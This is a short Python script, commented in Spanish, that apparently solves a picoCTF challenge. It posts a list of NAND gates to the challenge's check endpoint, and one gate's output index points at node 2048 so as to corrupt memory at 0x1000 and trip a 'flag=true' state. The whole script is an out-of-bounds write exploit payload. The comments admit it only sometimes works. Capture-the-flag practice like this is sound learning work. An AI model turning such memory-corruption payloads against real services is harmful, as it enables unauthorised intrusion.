import requests

# Este payload solo intenta forzar el valor de la dirección de memoria 0x1000 (el resultado)
# mediante una sola compuerta NAND que apunta directamente a ese offset.
# Nodo 2048 = 0x1000 (basado en el offset de serializeCircuit)
circuit = [
    # Mantenemos las puertas NOT para que el binario principal no crashee
    {"input1": 5, "input2": 5, "output": 1},
    {"input1": 6, "input2": 6, "output": 2},
    {"input1": 7, "input2": 7, "output": 3},
    {"input1": 8, "input2": 8, "output": 4},
    # Corrupción de la firma: Forzamos la dirección 0x1000 (Nodo 2048) a 0.
    # Si la CPU detecta que el resultado no es 0x3333 ni 0x1337,
    # a veces cae en el estado 'flag=true' por defecto.
    {"input1": 1, "input2": 1, "output": 2048} 
]

url = "http://activist-birds.picoctf.net:61158/check"
response = requests.post(url, json={"circuit": circuit})

print(response.json())
